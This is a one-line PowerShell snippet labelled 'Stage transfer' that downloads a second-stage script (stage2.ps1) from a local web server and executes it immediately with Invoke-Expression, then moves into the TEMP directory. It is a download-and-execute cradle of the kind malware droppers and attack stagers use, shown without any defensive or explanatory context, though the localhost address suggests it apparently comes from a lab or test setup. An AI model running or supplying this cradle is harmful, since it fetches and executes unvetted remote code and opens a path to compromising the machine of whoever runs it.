
<# Stage transfer #> Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://localhost:8000/stage2.ps1'); Set-Location -Path $env:TEMP
